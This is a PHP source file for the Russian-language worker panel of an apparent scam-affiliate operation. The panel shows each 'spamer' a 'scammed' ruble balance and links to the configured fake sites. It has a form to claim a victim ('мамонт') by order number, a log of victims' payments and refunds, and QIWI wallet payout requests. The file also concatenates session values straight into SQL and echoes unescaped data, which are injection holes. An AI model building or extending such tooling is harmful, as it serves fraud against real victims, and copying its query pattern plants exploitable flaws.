<?php
ob_start();
define("access", "yes");
session_start();
require_once(__DIR__ . '/../admin/engine/database/connection.php');
require_once(__DIR__ . '/../admin/engine/config.php');
if (!R::testConnection()) {
    echo '
		<style>
			body {
				margin: 0;
				padding: 0;
				background: #1d1d1d;
			}
			h2 {
				color: white;
				font-size: 1em;
				margin: 0;
				padding: 0;
				font-family: "arial";
				text-align: center;
				position: absolute;
				top: 50%;
				left: 50%;
				transform: translateX(-50%) translateY(-50%);
			}
		</style>
		<h2>Нет доступа к базе данных. Обратитесь к администратору.</h2>
		';
}
$us = R::load('users', 1);
$use = R::findOne('users', ' login = :login', array(':login' => $_SESSION['user']));
if (!$_SESSION['user'])
{
    header("Location: /spamer/login/");
}
if ($_SESSION['token'] !== $use['password']) {
    header("Location: /spamer/login/");
}
if (!$us->login) {
    header("Location: /spamer/login/");
}
$st = R::load('settings', 1);
$sn = R::load('sitenames', 1);
$sd = R::load('sitedomains', 1);
$msg = R::load('msg', 1);
$rand = mt_rand(0, 80000000);
$balance = R::findOne('users', 'login LIKE :login', array(':login' => $_SESSION['user']));
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>TapeAdmin > Panel</title>
    <link rel="stylesheet" type="text/css" <?php echo 'href="/admin/engine/css/main.css?' . $rand . '"'; ?>>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
          integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@8.8.7/dist/sweetalert2.all.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@8.8.7/dist/sweetalert2.min.css">
    <script type="text/javascript" src="/admin/engine/js/jquery-3.4.0.min.js"></script>
    <script type="text/javascript" <?php echo 'src="/admin/engine/js/main.js?' . $rand . '"'; ?>></script>
    <script src="https://kit.fontawesome.com/c8c58714da.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
            integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
            crossorigin="anonymous"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="apple-touch-icon" sizes="57x57" href="/admin/img/icons/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/admin/img/icons/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/admin/img/icons/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/admin/img/icons/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/admin/img/icons/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/admin/img/icons/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/admin/img/icons/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/admin/img/icons/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/admin/img/icons/apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192" href="/admin/img/icons/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/admin/img/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="/admin/img/icons/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/admin/img/icons/favicon-16x16.png">
    <link rel="manifest" href="/admin/img/icons/manifest.json">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/admin/img/icons/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
</head>
<body class="justify-content-center text-center">
<nav class="navbar navbar-expand-lg navbar-dark bggrad">
    <a class="navbar-brand" href="#">
        <img src="/admin/img/logo_white.png" height="50" alt="">
    </a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup"
            aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse justify-content-between" id="navbarNavAltMarkup">
        <ul class="navbar-nav">
            <a class="nav-item nav-link" id="hmain" href="#"><i class="fas fa-home"></i> Главная</a>
            <a class="nav-item nav-link" id="hlist" href="#"><i class="fas fa-stream"></i> Мои логи</a>
            <a class="nav-item nav-link" id="hwithdraw" href="#"><i class="fas fa-wallet"></i> Вывод средств</a>
        </ul>
        <ul class="navbar-nav">
            <a class="nav-item nav-link" onclick="return false;" style="cursor: default;" href="#"><i
                        class="fas fa-key"></i> Привет, <?php echo $_SESSION['user']; ?>, у тебя <?php echo $balance['scammed']; ?>₽</a>
        </ul>
    </div>
</nav>
<div class="main" id="main">
    <div class="card-deck">
        <div class="card">
            <div class="card-body">
                <h5 class="card-title"><?php echo $sn->ak; ?></h5>
                <p class="card-text"><?php echo $sd->ak; ?></p>
                <a <?php echo 'href="'.$sd->ak.'"'; ?> class="btn btn-outline-primary">Перейти</a>
            </div>
        </div>
        <div class="card">
            <div class="card-body">
                <h5 class="card-title"><?php echo $sn->av; ?></h5>
                <p class="card-text"><?php echo $sd->av; ?></p>
                <a <?php echo 'href="'.$sd->av.'"'; ?> class="btn btn-outline-primary">Перейти</a>
            </div>
        </div>
        <div class="card">
            <div class="card-body">
                <h5 class="card-title"><?php echo $sn->vr; ?></h5>
                <p class="card-text"><?php echo $sd->vr; ?></p>
                <a <?php echo 'href="'.$sd->vr.'"'; ?> class="btn btn-outline-primary">Перейти</a>
            </div>
        </div>
        <div class="card">
            <div class="card-body">
                <h5 class="card-title"><?php echo $sn->vk; ?></h5>
                <p class="card-text"><?php echo $sd->vk; ?></p>
                <a <?php echo 'href="'.$sd->vk.'"'; ?> class="btn btn-outline-primary">Перейти</a>
            </div>
        </div>
        <div class="card">
            <div class="card-body">
                <h5 class="card-title"><?php echo $sn->ht; ?></h5>
                <p class="card-text"><?php echo $sd->ht; ?></p>
                <a <?php echo 'href="'.$sd->ht.'"'; ?> class="btn btn-outline-primary">Перейти</a>
            </div>
        </div>
        <div class="card">
            <div class="card-body">
                <h5 class="card-title"><?php echo $sn->bw; ?></h5>
                <p class="card-text"><?php echo $sd->bw; ?></p>
                <a <?php echo 'href="'.$sd->bw.'"'; ?> class="btn btn-outline-primary">Перейти</a>
            </div>
        </div>
    </div>
    <hr style="content: '';background: linear-gradient(to right, #f5f5f5, #d1d1d1, #f5f5f5);height: 2px;width: 100%;left: 0;">
    <div class="card-deck">
        <div class="card text-center bg-light mb-3">
            <div class="card-header" style="color: #545454;">
                Сообщение от админа
            </div>
            <div class="card-body">
                <div class="form-group mb-3">
                    <textarea class="form-control" style="text-align: center;" id="exampleFormControlTextarea1" rows="2" disabled>
                        <?php
                        $mesg = $msg->text;
                        echo $mesg;
                        ?>
                    </textarea>
                </div>
            </div>
        </div>
    </div>
    <hr style="content: '';background: linear-gradient(to right, #f5f5f5, #d1d1d1, #f5f5f5);height: 2px;width: 100%;left: 0;">
    <div class="card-deck">
        <div class="card text-center bg-light">
            <div class="card-header" style="color: #545454;">
                Закрепить мамонта
            </div>
            <div class="card-body">
                <form class="form-inline justify-content-center" id="keep" action="/admin/engine/database/keep.php"
                      method="post">
                    <div class="form-group mx-sm-3 mb-2">
                        <input type="text" name="keepnumber" class="form-control glowin" id="keepnumber"
                               placeholder="Номер заказа" required>
                        <input type="hidden" name="user" <?php echo 'value="'.$_SESSION['user'].'"'; ?>>
                    </div>
                    <button type="submit" name="submit" class="gradbutton mb-2">
                        <i class="far fa-check-circle"></i> Привязать
                    </button>
                </form>
            </div>
        </div>
    </div>
</div>
<div class="main" id="withdraw" style="display: none;">
    <div class="card-deck">
        <div class="card text-center bg-light">
            <div class="card-header" style="color: #545454;">
                Запросить выплату
            </div>
            <div class="card-body">
                <form class="form-inline justify-content-center" id="withdrawal" action="/admin/engine/database/withdraw.php" method="post" autocomplete="off">
                    <div class="form-group mx-sm-3 mb-2">
                        <input type="number" name="qiwi" class="numb form-control glowin" id="qiwi" placeholder="QIWI Кошелек (без +)" required>
                    </div>
                    <div class="form-group mx-sm-3 mb-2">
                        <input type="number" name="sum" class="numb form-control glowin" id="sum" placeholder="Сумма вывода" required>
                    </div>
                    <input type="hidden" name="user" <?php echo 'value="'.$_SESSION['user'].'"'; ?>>
                    <button type="submit" name="submit" class="gradbutton mb-2">
                        <i class="far fa-check-circle"></i> Запросить
                    </button>
                </form>
            </div>
        </div>
    </div>
    <hr style="content: '';background: linear-gradient(to right, #f5f5f5, #d1d1d1, #f5f5f5);height: 2px;width: 100%;left: 0;">
    <div class="card-deck">
        <div class="card text-center bg-light">
            <div class="card-header" style="color: #545454;">
                История выплат
            </div>
            <div class="card-body">
                <div class="table-responsive">
                    <table id="userstable" class="table table-striped">
                        <thead>
                        <tr>
                            <th scope="col">ID</th>
                            <th scope="col">Сумма</th>
                            <th scope="col">Дата</th>
                            <th scope="col">Кошелек</th>
                        </tr>
                        </thead>
                        <tbody>
                        <?php
                        $rows = R::getAll( 'SELECT * FROM withdrawals WHERE user = "'.$_SESSION['user'].'" ORDER BY id DESC' );
                        foreach ($rows as $all) {
                            echo "<tr>
                                    <td style='line-height: 60px;'>" . $all["order"] . "</td>
                                    <td style='line-height: 60px;'>" . $all["sum"] . "₽</td>
                                    <td style='line-height: 60px;'>" . $all["date"] . "</td>
                                    <td style='line-height: 60px;'>" . $all["qiwi"] . "</td>
                                    </tr>";
                        }
                        echo "</table>";
                        ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="main" id="scamlist" style="display: none;">
    <div class="table-responsive">
        <table class="table table-striped bg-white">
            <thead>
            <tr>
                <th scope="col">Сайт</th>
                <th scope="col">Сумма</th>
                <th scope="col">Сумма возврата</th>
                <th scope="col">Дата</th>
                <th scope="col">Номер бронирования</th>
                <th scope="col">Статус</th>
            </tr>
            </thead>
            <tbody>
            <?php
            $rows = R::getAll("SELECT id, site, sum, refsum, dating, comment, status, statusn FROM logs WHERE spamer = '".$_SESSION['user']."' ORDER BY id DESC");
            foreach ($rows as $all) {
                if ($all["statusn"] == 0) {
                    echo "<tr class='bg-danger'><td style='color: white;'>" . $all["site"] . "</td><td style='color: white;'>" . $all["sum"] . "₽</td><td style='color: white;'>" . $all["refsum"] . "₽</td><td style='color: white;'>" . $all["dating"] . "</td><td style='color: white;'>" . $all["comment"] . "</td><td style='color: white;'>" . $all["status"] . "</td></tr>";
                }
                if ($all["statusn"] == 1) {
                    echo "<tr class='bg-success'><td style='color: white;'>" . $all["site"] . "</td><td style='color: white;'>" . $all["sum"] . "₽</td><td style='color: white;'>" . $all["refsum"] . "₽</td><td style='color: white;'>" . $all["dating"] . "</td><td style='color: white;'>" . $all["comment"] . "</td<td style='color: white;'>" . $all["status"] . "</td></tr>";
                }
                if ($all["statusn"] == 2) {
                    echo "<tr class='bg-primary'><td style='color: white;'>" . $all["site"] . "</td><td style='color: white;'>" . $all["sum"] . "₽</td><td style='color: white;'>" . $all["refsum"] . "₽</td><td style='color: white;'>" . $all["dating"] . "</td><td style='color: white;'>" . $all["comment"] . "</td><td style='color: white;'>" . $all["status"] . "</td></tr>";
                }
            }
            echo "</table>";
            ?>
            </tbody>
        </table>
    </div>
</div>
<script type="text/javascript">
    $("#hmain").click(function () {
        $("#scamlist").hide();
        $("#withdraw").hide();
        $("#main").show();
    });

    $("#hlist").click(function () {
        $("#main").hide();
        $("#withdraw").hide();
        $("#scamlist").show();
    });

    $("#hwithdraw").click(function () {
        $("#main").hide();
        $("#scamlist").hide();
        $("#withdraw").show();
    });
</script>
</body>
</html>